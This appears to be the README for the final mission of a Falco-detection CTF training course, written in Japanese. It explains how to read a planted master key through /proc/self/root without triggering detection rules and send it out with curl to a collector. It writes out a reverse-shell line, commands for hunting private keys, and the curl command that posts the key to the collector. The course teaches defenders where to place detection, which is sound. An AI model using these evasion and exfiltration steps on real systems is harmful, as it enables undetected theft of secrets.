# 10 — The Final Exfil (Boss)

集大成。master key を **発火させずに読み**、**箱の外の collector へ静かに
持ち出す (exfil)**。2 つすべてを満たして solve。単に読んで exfil するだけ
でも、禁止ルールを 1 つでも発火させていれば通らない (`requireExfil`)。

他シナリオで単体運用可能(採点は `falco-rule.yaml` 独立)、ただし 01-09 相当の
知識を前提とする教育設計である(下記「なぜ 4-9 の知識が要るか」参照)。

## 採点条件 (2 つすべて)

1. その user が collector に正しい flag (`expectedFlag` と一致) を exfil 済み
   (`POST /api/challenges/10-final-exfil/exfil`、`requireExfil: true`)
2. この attempt (このミッションが現在の課題になって以降) に `forbiddenRules`
   (7 つ) が 1 つも発火していない (時間では解除されない。発火した場合は
   Journey 画面の「このミッションをやり直す」ボタンでやり直す —
   その際 exfil 済みの証跡も無効化されるので、やり直した後は再度 exfil が必要)

**提出操作は不要**: 上記 2 条件を満たした時点で、バックグラウンドの
auto-solve sweeper (5 秒間隔) が自動で CLEARED にする (`Grader.Sweep`)。

## なぜ 4-9 の知識が要るか(設計意図)

旧版は「sensitive file を読む」だけで完結し、`/proc/self/root`(Mission 03)
一発で解けた。本版は **exfil(持ち出し)を必須アクション**にすることで、
trigger 系ミッションの知識を「やってはいけないこと」として要求する:

| 必須アクション | 素朴なやり方(発火) | 回避(学んだ知識) |
|---|---|---|
| flag を読む | `cat /opt/nimbus/vault/master.key` → Read-sensitive | `/proc/self/root`(**03**) |
| 箱の外へ送る | `bash -i >& /dev/tcp/...` → C2(**08**) | curl で HTTP POST |
| 送信ツール用意 | 自前 exfil バイナリを drop+実行 → Drop+exec(**07**) | 既存の curl を使う |
| 鍵を漁る/退避 | `find -name id_rsa`/`grep 'PRIVATE KEY'`/`ln` → Search(**04/05**)/Hardlink(**09**) | やらない |

collector は **HTTP のみ受信**するので、reverse shell では物理的に届かない。
= 静かな HTTP 持ち出し(curl)が唯一の現実解。

## Flag

plant (initContainer) が `/opt/nimbus/vault/master.key` に flag だけを
書き込む(コメントや前後の内容は無し — `cat` すれば flag そのものが出る)。
実値はイベント毎に注入される。ローカルは dev default
`FALCO{dev-final-exfil}`。

## 想定解

```bash
# 1) 発火させずに読む (Mission 03 の技法をこの vault ファイルに再利用)
FLAG=$(cat /proc/self/root/opt/nimbus/vault/master.key)

# 2) 既存 curl で collector へ静かに HTTP exfil
curl -s "${FALCO_CTF_COLLECTOR}/api/challenges/10-final-exfil/exfil" \
  -H 'Content-Type: application/json' \
  -d "{\"user\":\"${FALCO_CTF_USER}\",\"flag\":\"${FLAG}\"}"
#  → {"received":true,...}
# 提出操作は不要 — 禁止ルールを一度も発火させていなければ数秒以内に自動で solve
```

## 解説

- **exfil を必須化したのが肝**: 「読むだけ」では 03 一本に collapse する
  (`/proc/self/root` で全 sensitive file が読め、benign マーカーの grep は
  どのルールも踏まない)。持ち出しという *必須アクション* を足すことで、
  「派手な持ち出し = 発火」という 07/08 の教訓が初めて要求される。
- collector が HTTP 受信専用なのは意図的: reverse shell では届かないので、
  curl(既存バイナリ・dup を伴わない HTTP)に自然に誘導される。
- 禁止ルールの検査は二重の安全網: もし reverse shell や drop+exec を試して
  発火させると、この attempt はやり直すまで `evaded:false` で弾かれ続ける
  (時間では解除されない)。やり直すと exfil の証跡も消えるので、
  再挑戦する際は (2) からやり直す必要がある。
- 講評: 防御側は「検知点を増やす」だけでなく「攻撃者が必ず通る隘路
  (= 持ち出し)」に検知を置くほど、攻撃コストが跳ね上がる。
